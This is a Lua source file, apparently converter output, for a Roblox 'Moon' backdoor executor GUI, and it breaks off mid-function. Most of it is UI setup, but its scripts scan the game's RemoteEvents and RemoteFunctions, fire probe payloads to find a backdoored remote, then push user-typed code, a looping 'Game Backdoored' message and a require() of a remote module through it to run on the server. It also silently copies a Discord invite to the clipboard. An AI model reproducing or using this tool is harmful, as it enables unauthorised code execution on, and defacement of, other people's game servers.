G2L["90"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["91"] = Instance.new("TextButton", G2L["8c"]);
G2L["91"]["BorderSizePixel"] = 0;
G2L["91"]["TextSize"] = 22;
G2L["91"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["91"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["91"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["91"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["91"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["91"]["Text"] = [[Execute]];
G2L["91"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["92"] = Instance.new("LocalScript", G2L["91"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["93"] = Instance.new("UICorner", G2L["91"]);
G2L["93"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["94"] = Instance.new("UICorner", G2L["8c"]);
G2L["94"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["95"] = Instance.new("TextLabel", G2L["8c"]);
G2L["95"]["BorderSizePixel"] = 0;
G2L["95"]["TextSize"] = 32;
G2L["95"]["TextTransparency"] = 0.49;
G2L["95"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["95"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["95"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["95"]["BackgroundTransparency"] = 1;
G2L["95"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["95"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["95"]["Text"] = [[Nuclear Gui]];
G2L["95"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["96"] = Instance.new("Frame", G2L["2f"]);
G2L["96"]["BorderSizePixel"] = 0;
G2L["96"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["96"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["96"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["96"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["97"] = Instance.new("UIStroke", G2L["96"]);
G2L["97"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["97"]["Thickness"] = 1.3;
G2L["97"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["98"] = Instance.new("ImageLabel", G2L["96"]);
G2L["98"]["BorderSizePixel"] = 0;
G2L["98"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["98"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["98"]["Image"] = [[rbxassetid://132987071478963]];
G2L["98"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["98"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["98"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["99"] = Instance.new("UICorner", G2L["98"]);
G2L["99"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["9a"] = Instance.new("UIGradient", G2L["98"]);
G2L["9a"]["Rotation"] = 90;
G2L["9a"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["9b"] = Instance.new("TextButton", G2L["96"]);
G2L["9b"]["BorderSizePixel"] = 0;
G2L["9b"]["TextSize"] = 22;
G2L["9b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9b"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["9b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9b"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["9b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9b"]["Text"] = [[Execute]];
G2L["9b"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["9c"] = Instance.new("LocalScript", G2L["9b"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["9d"] = Instance.new("UICorner", G2L["9b"]);
G2L["9d"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["9e"] = Instance.new("UICorner", G2L["96"]);
G2L["9e"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["9f"] = Instance.new("TextLabel", G2L["96"]);
G2L["9f"]["BorderSizePixel"] = 0;
G2L["9f"]["TextSize"] = 32;
G2L["9f"]["TextTransparency"] = 0.49;
G2L["9f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9f"]["BackgroundTransparency"] = 1;
G2L["9f"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["9f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9f"]["Text"] = [[Police AI]];
G2L["9f"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["a0"] = Instance.new("Frame", G2L["2f"]);
G2L["a0"]["BorderSizePixel"] = 0;
G2L["a0"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["a0"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["a0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a0"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["a1"] = Instance.new("UIStroke", G2L["a0"]);
G2L["a1"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["a1"]["Thickness"] = 1.3;
G2L["a1"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["a2"] = Instance.new("ImageLabel", G2L["a0"]);
G2L["a2"]["BorderSizePixel"] = 0;
G2L["a2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a2"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["a2"]["Image"] = [[rbxassetid://116070945479545]];
G2L["a2"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["a2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a2"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["a3"] = Instance.new("UICorner", G2L["a2"]);
G2L["a3"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["a4"] = Instance.new("UIGradient", G2L["a2"]);
G2L["a4"]["Rotation"] = 90;
G2L["a4"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["a5"] = Instance.new("TextButton", G2L["a0"]);
G2L["a5"]["BorderSizePixel"] = 0;
G2L["a5"]["TextSize"] = 22;
G2L["a5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a5"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["a5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a5"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["a5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a5"]["Text"] = [[Soon!!!]];
G2L["a5"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["a6"] = Instance.new("UICorner", G2L["a5"]);
G2L["a6"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["a7"] = Instance.new("UICorner", G2L["a0"]);
G2L["a7"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["a8"] = Instance.new("TextLabel", G2L["a0"]);
G2L["a8"]["BorderSizePixel"] = 0;
G2L["a8"]["TextSize"] = 32;
G2L["a8"]["TextTransparency"] = 0.49;
G2L["a8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a8"]["BackgroundTransparency"] = 1;
G2L["a8"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["a8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a8"]["Text"] = [[More Coming]];
G2L["a8"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.UICorner
G2L["a9"] = Instance.new("UICorner", G2L["25"]);
G2L["a9"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.RE
G2L["aa"] = Instance.new("TextButton", G2L["25"]);
G2L["aa"]["BorderSizePixel"] = 0;
G2L["aa"]["TextSize"] = 20;
G2L["aa"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["aa"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["aa"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["aa"]["ZIndex"] = 1000000000;
G2L["aa"]["Size"] = UDim2.new(-0.01895, 98, 0.01352, 22);
G2L["aa"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["aa"]["Text"] = [[RE]];
G2L["aa"]["Name"] = [[RE]];
G2L["aa"]["Position"] = UDim2.new(0.62522, 0, 0.03894, 0);


-- StarterGui.ScreenGui.Hub.RE.LocalScript
G2L["ab"] = Instance.new("LocalScript", G2L["aa"]);



-- StarterGui.ScreenGui.Hub.RE.UICorner
G2L["ac"] = Instance.new("UICorner", G2L["aa"]);
G2L["ac"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.LocalScript
local function C_2()
	local script = G2L["2"];
	local ownerId = 8167967082

	local function NotifyOwnerJoined(player)
		game.StarterGui:SetCore("SendNotification", {
			Title = "Moon",
			Text = "Omg Moon Owner joined !!! " .. player.Name,
			Icon = "rbxassetid://7395824155",
			Duration = 10,
		})
	end

	game.Players.PlayerAdded:Connect(function(player)
		if player.UserId == ownerId then
			NotifyOwnerJoined(player)
		end
	end)

end;
task.spawn(C_2);
-- StarterGui.ScreenGui.Load.LocalScript
local function C_4()
	local script = G2L["4"];
	wait(5)

	for i = 0.4, 1, 0.01 do
		script.Parent.Logo.BackgroundTransparency = i
		script.Parent.bg.BackgroundTransparency =i 
	end

	wait(1)
	script.Parent.bg.Visible = false
	script.Parent.Parent.Main.Visible = true
end;
task.spawn(C_4);
-- StarterGui.ScreenGui.Load.bg.LocalScript
local function C_6()
	local script = G2L["6"];
	local UI_ELEMENT = script.Parent 
	local START_POSITION = UDim2.new(0.34, 0, 0.5, 0)
	local END_POSITION = UDim2.new(0.58, 0, 0.5, 0)
	local TWEEN_DURATION = 1.0
	local EASING_STYLE = Enum.EasingStyle.Sine 
	local EASING_DIRECTION = Enum.EasingDirection.InOut 

	local tweenInfo = TweenInfo.new(
		TWEEN_DURATION,
		EASING_STYLE,
		EASING_DIRECTION,
		-1,
		true, 
		0 
	)


	local tween = game:GetService("TweenService"):Create(UI_ELEMENT, tweenInfo, {Position = END_POSITION})

	tween:Play()

end;
task.spawn(C_6);
-- StarterGui.ScreenGui.Load.Logo.LocalScript
local function C_8()
	local script = G2L["8"];
	local IMAGE_LOGO = script.Parent


	local ROTATION_ANGLE_1 = -5 
	local ROTATION_ANGLE_2 = 9  


	local TWEEN_DURATION = 1.0 
	local EASING_STYLE = Enum.EasingStyle.Quad 
	local EASING_DIRECTION = Enum.EasingDirection.InOut 

	local tweenInfo1 = TweenInfo.new(
		TWEEN_DURATION,
		EASING_STYLE,
		EASING_DIRECTION,
		0, 
		false, 
		0 
	)

	local tweenInfo2 = TweenInfo.new(
		TWEEN_DURATION,
		EASING_STYLE,
		EASING_DIRECTION,
		0, 
		false, 
		0
	)


	local function startRotationLoop()
		while true do
			local tween1 = game:GetService("TweenService"):Create(
				IMAGE_LOGO,
				tweenInfo1,
				{Rotation = ROTATION_ANGLE_1}
			)
			tween1:Play()
			tween1.Completed:Wait()

			local tween2 = game:GetService("TweenService"):Create(
				IMAGE_LOGO,
				tweenInfo2,
				{Rotation = ROTATION_ANGLE_2}
			)
			tween2:Play()
			tween2.Completed:Wait() 
		end
	end


	startRotationLoop()
end;
task.spawn(C_8);
-- StarterGui.ScreenGui.Load.Logo.LocalScript
local function C_9()
	local script = G2L["9"];
	wait(5)

	for i = 0.4, 1, 0.01 do
		script.Parent.BackgroundTransparency = i
		wait(time)
	end

	script.Parent:TweenSize(UDim2.new(0, 73,0, 49))
	script.Parent:TweenPosition(UDim2.new(0.066, 0,0.892, 0))
end;
task.spawn(C_9);
-- StarterGui.ScreenGui.Main.UIDrag
local function C_d()
	local script = G2L["d"];
	-- Made by Real_IceyDev (@lceyDex) --
	-- Simple UI dragger (PC Only/Any device that has a mouse) --

	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil

	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_d);
-- StarterGui.ScreenGui.Main.LocalScript
local function C_e()
	local script = G2L["e"];
	game.StarterGui:SetCore("SendNotification", {
		Title = "Moon",
		Text = "Please Join Our Server.",
		Icon = "rbxassetid://7395824155",
		Duration = 10,
	})

	setclipboard("https://discord.gg/W5bNxXf85r")
end;
task.spawn(C_e);
-- StarterGui.ScreenGui.Main.LocalScript
local function C_f()
	local script = G2L["f"];
	local buttons = {
		Exe = script.Parent.Buttons.Exe;
		clear = script.Parent.Buttons.Clear;
		connect = script.Parent.Connect;
	}

	local statustext = script.Parent.Stats
	local codeBar = script.Parent.CodeBar

	local statusIcons = {
		Offline = "🔴";
		Checking = "🟠";
		Allow = "🟢";
	}

	local function setStatus(key)
		if key == "O" then
			statustext.Text = statusIcons.Offline
		elseif key == "C" then
			statustext.Text = statusIcons.Checking
		elseif key == "B" then
			statustext.Text = statusIcons.Allow
		end
	end

	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0 

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end


		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}



		local RE = [[
		local m = Instance.new("Message", game.Workspace)
		m.Text = "Moon Backdoor On top !!"
		wait(4)
		m:Destroy()
		]]








		local Hint = [[
		local hint = Instance.new("Hint", game.Workspace)
		hint.Text = "Game Backdoored by Moon Exe !! gg/W5bNxXf85r --- fastest backdoor executor"
		
		while true do
			wait(5)
			hint:Destroy()
			wait(5)
			local hint = Instance.new("Hint", game.Workspace)
			hint.Text = "Game Backdoored by Moon Exe !! gg/W5bNxXf85r --- fastest backdoor executor"
		end
		]]



		

		pcall(function()
			if isFunction then
				task.spawn(function() 
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(RE) end)
					pcall(function() remote:InvokeServer(Hint) end) --- its hint dumbass
				
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(RE) end)
				pcall(function() remote:FireServer(Hint) end) --- its hint dumbass

			end
		end)

		return testId
	end

	local function simpleFindRemote()
		setStatus("C")
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0 
		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock() 
		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01 or 0.05 or 0.5
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end

	local exeConnection
	local function updateExeButton()
		if exeConnection then
			exeConnection:Disconnect()
			exeConnection = nil
		end
		if foundExploit then
			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
				local code = codeBar.Text
				if code and code ~= "" then
					if remoteEvent then
						print("ℹ️ Executing via RemoteEvent:", remoteEvent:GetFullName())
						pcall(function() remoteEvent:FireServer(code) end)
					elseif remoteFunction then
						print("ℹ️ Executing via RemoteFunction:", remoteFunction:GetFullName())
						pcall(function()
							remoteFunction:InvokeServer("moonTSS", code)
						end)
					end
					StarterGui:SetCore("SendNotification", {
						Title = "🌙 moon",
						Text = "Code executed through backdoor",
						Icon = "rbxassetid://73958241564252",
						Duration = 3,
					})
				else
					StarterGui:SetCore("SendNotification", {
						Title = "🌙 moon",
						Text = "No Code to Execute",
						Icon = "rbxassetid://73958241564252",
						Duration = 3,
					})
				end
			end)
		else
			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
				StarterGui:SetCore("SendNotification", {
					Title = "Moon",
					Text = "No Backdoor Found",
					Icon = "rbxassetid://73958241564252",
					Duration = 5,
				})
			end)
		end
	end

	buttons.connect.MouseButton1Click:Connect(function()
		setStatus("C")
		StarterGui:SetCore("SendNotification", {
			Title = "Moon",
			Text = "Checking for backdoors...",
			Icon = "rbxassetid://7395824155",
			Duration = 3,
		})
		task.spawn(function()
			local scanStart = os.clock() 
			simpleFindRemote()
			local scanEnd = os.clock()
			print(string.format("🌙 moon: Scan completed in %.2f ms", (scanEnd - scanStart) * 1000))

			if foundExploit then
				setStatus("B")
				local formattedTime = string.format("%.2f", timeToFindExploit)
				StarterGui:SetCore("SendNotification", {
					Title = "🌙 moon",
					Text = "Backdoor found in " .. formattedTime .. " seconds!",
					Icon = "rbxassetid://73958241564252",
					Duration = 5,
				})
			else
				setStatus("O")
				StarterGui:SetCore("SendNotification", {
					Title = "🌙 moon",
					Text = "No backdoor found",
					Icon = "rbxassetid://73958241564252",
					Duration = 5,
				})
			end
			updateExeButton()
		end)
	end)

	buttons.clear.MouseButton1Click:Connect(function()
		codeBar.Text = ""
	end)

	setStatus("O")
	updateExeButton()
end;
task.spawn(C_f);
-- StarterGui.ScreenGui.Main.Hub.LocalScript
local function C_23()
	local script = G2L["23"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
		script.Parent.Parent.Parent.Hub.Visible = true
	end)
end;
task.spawn(C_23);
-- StarterGui.ScreenGui.Hub.UIDrag
local function C_26()
	local script = G2L["26"];
	-- Made by Real_IceyDev (@lceyDex) --
	-- Simple UI dragger (PC Only/Any device that has a mouse) --

	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil

	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_26);
-- StarterGui.ScreenGui.Hub.Hub.LocalScript
local function C_2d()
	local script = G2L["2d"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
		script.Parent.Parent.Parent.Main.Visible = true
	end)
end;
task.spawn(C_2d);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_38()
	local script = G2L["38"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(4513235536).G(']] .. player.Name .. [[')]]

		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end

	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else
		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_38);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_42()
	local script = G2L["42"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
